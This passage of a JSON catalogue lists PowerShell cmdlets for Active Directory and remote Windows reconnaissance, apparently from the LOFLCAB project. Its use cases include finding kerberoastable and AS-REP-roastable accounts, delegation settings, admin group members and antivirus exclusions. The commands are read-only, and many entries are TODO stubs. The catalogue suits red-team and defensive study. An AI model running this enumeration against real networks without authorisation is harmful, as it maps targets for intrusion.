"Type":"Cmdlets","Name":"Get-ADGroup","Description":"Gets one or more Active Directory groups","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADGroup -Filter * -Server ad.bitsadmin.com","Description":"List all groups","Usecases":["Enumerate groups"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADGroup/"},{
"Type":"Cmdlets","Name":"Get-ADGroupMember","Description":"Gets the members of an Active Directory group","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADGroupMember \"Domain Admins\" -Recursive -Server ad.bitsadmin.com","Description":"List all members of a group","Usecases":["Understand interesting targets in the environment"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADGroupMember/"},{
"Type":"Cmdlets","Name":"Get-ADObject","Description":"Gets one or more Active Directory objects","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo, userAccountControl","Description":"Query AD Objects using filter","Usecases":["Enumerate users and computers with constrained delegation enabled"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADObject/"},{
"Type":"Cmdlets","Name":"Get-ADOrganizationalUnit","Description":"Gets one or more Active Directory organizational units","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADOrganizationalUnit 'OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com'","Description":"Obtain information about OU","Usecases":["Learn which policies are applied to an OU"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADOrganizationalUnit/"},{
"Type":"Cmdlets","Name":"Get-ADReplicationSubnet","Description":"Returns a specific Active Directory subnet or a set of AD subnets based on a specified filter.","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADReplicationSubnet -Filter * -Server ad.bitsadmin.com | select Name,Location,Site","Description":"List replication subnets","Usecases":["Enumerate subnets in use in the domain; useful to add LOFL tun2socks routes"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADReplicationSubnet/"},{
"Type":"Cmdlets","Name":"Get-ADTrust","Description":"Returns all trusted domain objects in the directory","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADTrust -Filter * -Server ad.bitsadmin.com | ft Direction,Name,TrustType","Description":"Query AD trusts","Usecases":["Understand trust relations of the forest and domains"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADTrust/"},{
"Type":"Cmdlets","Name":"Get-ADUser","Description":"Gets one or more Active Directory users","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADUser -Filter {DoesNotRequirePreauth -eq $true}","Description":"List users based on filter","Usecases":["Enumerate aseproastable users"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null},{"Command":"Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName","Description":"List users based on filter","Usecases":["Enumerate kerberoastable users"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null},{"Command":"Get-ADUser -Filter {TrustedForDelegation -eq $true}","Description":"List users based on filter","Usecases":["Enumerate accounts that are trusted for unconstrained delegation"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null},{"Command":"Get-ADUser -LDAPFilter \"(adminCount=1)\" -Server ad.bitsadmin.com","Description":"List users based on LDAP filter","Usecases":["Enumerate users which [have been/are] members of at least one Administrative group"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADUser/"},{
"Type":"Cmdlets","Name":"Get-AppvVirtualProcess","Description":"Displays the virtual processes running on a computer","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Get-AppvVirtualProcess","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `AppvClient`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-AppvVirtualProcess/"},{
"Type":"Cmdlets","Name":"Get-ChildItem","Description":"Gets the files and folders in a file system drive.","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"Get-ChildItem -LiteralPath '\\\\?\\UNC\\FS1.ad.bitsadmin.com\\IT' -Depth 25 -Force | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Mode=$_.Mode; Length=$_.Length; LastWriteTime=$_.LastWriteTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss'); FullName=$_.FullName.Replace('\\?\\UNC','') } } | Export-Csv -Encoding UTF8 -NoTypeInformation FS1_IT.csv","Description":"Enumerate network share","Usecases":["Create file listing of network share to identify files that can be used for escalation"],"Function":"Data","Comments":["PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1083"]}],"Resources":["https://blog.bitsadmin.com/digging-for-secrets"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ChildItem/"},{
"Type":"Cmdlets","Name":"Get-CimAssociatedInstance","Description":"Retrieves the CIM instances that are connected to a specific CIM instance by an association","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-CimAssociatedInstance -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-CimAssociatedInstance/"},{
"Type":"Cmdlets","Name":"Get-CimClass","Description":"Gets a list of CIM classes in a specific namespace","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-CimClass -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-CimClass/"},{
"Type":"Cmdlets","Name":"Get-CimInstance","Description":"Gets the CIM instances of a class from a CIM server","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -CimSession $s -ClassName Win32_Process","Description":"Get instances of a CIM class","Usecases":["List running processes"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]},{"Command":"Get-CimInstance -ClassName Win32_Process | % { [PSCustomObject]@{Name=$_.Name; User=$(Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User } }","Description":"Get instances of a CIM class","Usecases":["List running processes including username"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]},{"Command":"Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s","Description":"Get instances of a CIM class","Usecases":["Obtain the \"Remote Desktop Services\" service instance. This can now for example be used to launch or stop the service"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-CimInstance/"},{
"Type":"Cmdlets","Name":"Get-DfsnFolder","Description":"Gets settings for a DFS namespace folder","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DfsnFolder -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DFSN`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DfsnFolder/"},{
"Type":"Cmdlets","Name":"Get-DfsnFolderTarget","Description":"Gets settings for targets of a DFS namespace folder","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DfsnFolderTarget -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DFSN`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DfsnFolderTarget/"},{
"Type":"Cmdlets","Name":"Get-DfsnRoot","Description":"Gets settings for DFS namespaces","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DfsnRoot -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DFSN`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DfsnRoot/"},{
"Type":"Cmdlets","Name":"Get-DfsnRootTarget","Description":"Gets settings for root targets of a DFS namespace","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DfsnRootTarget -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DFSN`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DfsnRootTarget/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerAuditLog","Description":"Gets the configuration parameters related to the audit log of the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerAuditLog -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerAuditLog/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerDatabase","Description":"Gets the configuration parameters related to the database of the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerDatabase -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerDatabase/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerDnsCredential","Description":"Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerDnsCredential -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerDnsCredential/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerInDC","Description":"Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from Active Directory (AD)","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerInDC -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerInDC/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerSetting","Description":"Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerSetting -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerSetting/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerv4DnsSetting","Description":"Gets the DNS settings configured on the Dynamic Host Configuration Protocol (DHCP) server service for a specific scope, reservation, or server level","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerv4DnsSetting -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerv4DnsSetting/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerv4Filter","Description":"Gets the list of all MAC addresses from the allow list or the deny list on the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerv4Filter -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerv4Filter/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerv4FilterList","Description":"Gets the enabled state of the allow filter list and deny filter list set on the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerv4FilterList -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerv4FilterList/"},{
"Type":"Cmdlets","Name":"Get-DhcpServerv4Lease","Description":"Gets one or more lease records from the Dynamic Host Configuration Protocol (DHCP) server service","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DhcpServerv4Lease -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DhcpServerv4Lease/"},{
"Type":"Cmdlets","Name":"Get-Disk","Description":"Gets one or more disks visible to the operating system","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-Disk -CimSession $s","Description":"List disks","Usecases":["Reconnaissance on disks"],"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Disk/"},{
"Type":"Cmdlets","Name":"Get-DiskImage","Description":"Gets one or more disk image objects (virtual hard disk or ISO)","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-DiskImage -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DiskImage/"},{
"Type":"Cmdlets","Name":"Get-DnsClientCache","Description":"Retrieves the contents of the DNS client cache","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-DnsClientCache -CimSession $s","Description":"List cached DNS entries","Usecases":["Reconnaissance on the network/Internet activities on the computer"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsClient`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsClientCache/"},{
"Type":"Cmdlets","Name":"Get-DnsClientNrptRule","Description":"Retrieves the DNS client NRPT rules","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DnsClientNrptRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsClient`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsClientNrptRule/"},{
"Type":"Cmdlets","Name":"Get-DnsClientServerAddress","Description":"Gets DNS server IP addresses from the TCP/IP properties on an interface","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DnsClientServerAddress -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsClient`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsClientServerAddress/"},{
"Type":"Cmdlets","Name":"Get-DnsServer","Description":"Retrieves a DNS server configuration","Updated":"2023-07-01","Toolsets":["CIMSession","RSAT"],"Commands":[{"Command":"Get-DnsServer -CimSession $s","Description":"Show DNS server configuration","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsServer/"},{
"Type":"Cmdlets","Name":"Get-DnsServerCache","Description":"Retrieves DNS server cache settings","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DnsServerCache -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsServerCache/"},{
"Type":"Cmdlets","Name":"Get-DnsServerForwarder","Description":"Gets forwarder configuration settings on a DNS server","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-DnsServerForwarder -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-DnsServerForwarder/"},{
"Type":"Cmdlets","Name":"Get-EtwTraceProvider","Description":"Gets ETW trace providers","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-EtwTraceProvider -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `EventTracingManagement`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-EtwTraceProvider/"},{
"Type":"Cmdlets","Name":"Get-EtwTraceSession","Description":"Gets ETW trace sessions","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-EtwTraceSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `EventTracingManagement`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-EtwTraceSession/"},{
"Type":"Cmdlets","Name":"Get-FileShare","Description":"Retrieves file share objects and their properties","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-FileShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-FileShare/"},{
"Type":"Cmdlets","Name":"Get-GPO","Description":"Gets one GPO or all the GPOs in a domain","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Get-GPO","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-GPO/"},{
"Type":"Cmdlets","Name":"Get-GPOReport","Description":"Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain","Updated":"2023-07-01","Toolsets":["Builtin","RSAT","TODO"],"Commands":[{"Command":"Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path \"$pwd\\domain.html\"","Description":"Get report in HTML","Usecases":["Information on group policies"],"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null},{"Command":"Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Xml -Path \"$pwd\\domain.xml\"","Description":"Get report in XML","Usecases":["Information on group policies"],"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null},{"Command":"Get-GPOReport","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-GPOReport/"},{
"Type":"Cmdlets","Name":"Get-GPPermission","Description":"Gets the permission level for one or more security principals on a specified GPO","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Get-GPPermission","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-GPPermission/"},{
"Type":"Cmdlets","Name":"Get-GPResultantSetOfPolicy","Description":"Gets and writes the RSoP information for a user, a computer, or both to a file","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Get-GPResultantSetOfPolicy","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-GPResultantSetOfPolicy/"},{
"Type":"Cmdlets","Name":"Get-GPStarterGPO","Description":"Gets one Starter GPO or all Starter GPOs in a domain","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Get-GPStarterGPO","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-GPStarterGPO/"},{
"Type":"Cmdlets","Name":"Get-HotFix","Description":"Gets the hotfixes that are installed on local or remote computers","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"Get-HotFix -ComputerName W10.ad.bitsadmin.com","Description":"List installed KBs","Usecases":["Feed them to Windows Exploit Suggester - Next Generation to identify what vulnerabilities the system is vulnerable to"],"Function":"Recon","Comments":["PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["TA0043"]}],"Resources":["https://blog.bitsadmin.com/windows-security-updates-for-hackers"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-HotFix/"},{
"Type":"Cmdlets","Name":"Get-MpComputerStatus","Description":"Gets the status of antimalware software on the computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-MpComputerStatus -CimSession $s","Description":"Check status of AV","Usecases":["Identify whether the AV is active"],"Function":"Recon","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-MpComputerStatus/"},{
"Type":"Cmdlets","Name":"Get-MpPreference","Description":"Gets preferences for the Windows Defender scans and updates","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-MpPreference -CimSession $s","Description":"Obtain the AV's configuration","Usecases":["Identify whether the AV is active and which exclusion paths are configured"],"Function":"Recon","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-MpPreference/"},{
